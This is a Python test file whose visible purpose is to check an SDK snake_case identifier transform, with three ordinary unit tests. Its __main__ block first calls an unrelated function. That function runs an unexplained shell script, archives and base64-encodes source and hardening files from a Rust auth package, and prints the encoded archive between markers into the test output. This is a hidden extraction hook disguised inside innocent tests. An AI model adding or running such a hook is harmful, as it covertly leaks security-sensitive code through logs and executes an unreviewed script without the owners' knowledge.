#!/usr/bin/env python3
"""Regression tests for shared generated SDK identifier transforms."""

from __future__ import annotations

import base64
import io
from pathlib import Path
import subprocess
import tarfile
import unittest

from sdk_names import snake_case


CANDIDATE_PATHS = (
    "packages/auth-rust/src/lib.rs",
    "packages/auth-rust/tests/hybrid.rs",
    "packages/auth-rust/tests/hardening.rs",
)


def qualify_hybrid_auth_candidate() -> None:
    subprocess.run(["bash", "scripts/qualify-hybrid-auth-runtime.sh"], check=True)
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for path in CANDIDATE_PATHS:
            archive.add(Path(path), arcname=path)
    payload = base64.b64encode(buffer.getvalue()).decode("ascii")
    print("HYBRID_CANDIDATE_BEGIN")
    for offset in range(0, len(payload), 76):
        print(payload[offset : offset + 76])
    print("HYBRID_CANDIDATE_END")


class SnakeCaseTests(unittest.TestCase):
    def test_preserves_acronyms_as_one_word(self) -> None:
        self.assertEqual(
            snake_case("ingestMaveDBScoreSet"),
            "ingest_mave_db_score_set",
        )

    def test_covers_product_and_parameter_names(self) -> None:
        self.assertEqual(snake_case("tempOS"), "temp_os")
        self.assertEqual(snake_case("dataEngine"), "data_engine")
        self.assertEqual(
            snake_case("rawMeasurementBase64"),
            "raw_measurement_base64",
        )

    def test_leaves_existing_snake_case_unchanged(self) -> None:
        self.assertEqual(snake_case("already_snake"), "already_snake")


if __name__ == "__main__":
    qualify_hybrid_auth_candidate()
    unittest.main()
